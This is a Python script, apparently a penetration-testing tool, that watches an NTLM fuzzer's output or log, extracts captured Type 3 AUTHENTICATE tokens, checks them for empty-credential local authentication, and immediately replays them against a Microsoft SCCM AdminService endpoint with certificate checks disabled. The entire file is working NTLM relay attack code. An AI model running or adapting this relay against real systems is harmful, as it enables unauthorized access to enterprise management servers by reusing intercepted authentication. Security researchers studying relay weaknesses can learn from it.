#!/usr/bin/env python3
"""
Real-time Type 3 relay tester
Monitors http_auth_tester_full.py output and immediately relays captured Type 3 tokens
"""
import subprocess
import re
import time
import requests
import sys
import base64
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Target SCCM AdminService
TARGET = "https://sccm-sitesrv1.domain.local/AdminService/wmi/SMS_Admin"

# Regex to extract Type 3 tokens from fuzzer output
TYPE3_REGEX = r"Full NTLM Token \(base64\): (TlRMTVNTUAAD[A-Za-z0-9+/=]+)"

print("=== Real-time Type 3 Relay Tester ===")
print(f"Target: {TARGET}")
print("Waiting for Type 3 AUTHENTICATE tokens from fuzzer...")
print()

def test_type3_token(token_b64):
    """Test a Type 3 token against the target immediately"""
    print(f"\n[*] Captured Type 3 token: {token_b64[:60]}...")
    
    # Decode to verify it's a Type 3
    try:
        token_bytes = base64.b64decode(token_b64)
        if token_bytes[8:12] != b'\x03\x00\x00\x00':
            print(f"[!] Not a Type 3 message, skipping")
            return
        
        # Check if it's local auth (empty domain/username)
        domain_len = int.from_bytes(token_bytes[28:30], 'little')
        user_len = int.from_bytes(token_bytes[36:38], 'little')
        
        if domain_len == 0 and user_len == 0:
            print(f"[+] This is LOCAL AUTH (empty credentials)!")
        else:
            print(f"[!] Not local auth (domain_len={domain_len}, user_len={user_len})")
    except Exception as e:
        print(f"[!] Failed to parse token: {e}")
        return
    
    # Test 1: Simple GET request
    print(f"[*] Testing with GET request...")
    headers = {'Authorization': f'Negotiate {token_b64}'}
    
    try:
        response = requests.get(TARGET, headers=headers, verify=False, timeout=5)
        print(f"[*] Response: {response.status_code}")
        
        if response.status_code == 200:
            print(f"[+] SUCCESS! Authentication worked!")
            print(f"[+] Response length: {len(response.content)} bytes")
        elif response.status_code == 401:
            print(f"[-] FAILED: 401 Unauthorized")
            if 'WWW-Authenticate' in response.headers:
                print(f"    WWW-Authenticate: {response.headers['WWW-Authenticate']}")
        elif response.status_code == 500:
            print(f"[+] 500 error - Auth may have succeeded but request failed")
        elif response.status_code == 403:
            print(f"[+] 403 Forbidden - Auth succeeded but insufficient permissions")
        else:
            print(f"[?] Unexpected status: {response.status_code}")
        
        # Show response headers
        print(f"[*] Response headers:")
        for key, value in response.headers.items():
            if key.lower() in ['www-authenticate', 'content-type', 'content-length']:
                print(f"    {key}: {value}")
                
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
    
    print()

# Option 1: Read from fuzzer log file
if len(sys.argv) > 1 and sys.argv[1] == '--log':
    log_file = sys.argv[2] if len(sys.argv) > 2 else 'http_auth_test.log'
    print(f"[*] Reading from log file: {log_file}")
    
    with open(log_file, 'r') as f:
        for line in f:
            match = re.search(TYPE3_REGEX, line)
            if match:
                token = match.group(1)
                test_type3_token(token)
                time.sleep(1)  # Small delay between tests

# Option 2: Monitor fuzzer output in real-time
else:
    print("[*] Start your fuzzer now:")
    print("    sudo python3 http_auth_tester_full.py -p 80 -m ntlm_401")
    print("[*] This script will capture and relay Type 3 tokens automatically")
    print()
    
    try:
        while True:
            line = input()
            match = re.search(TYPE3_REGEX, line)
            if match:
                token = match.group(1)
                test_type3_token(token)
    except KeyboardInterrupt:
        print("\n[*] Stopped")
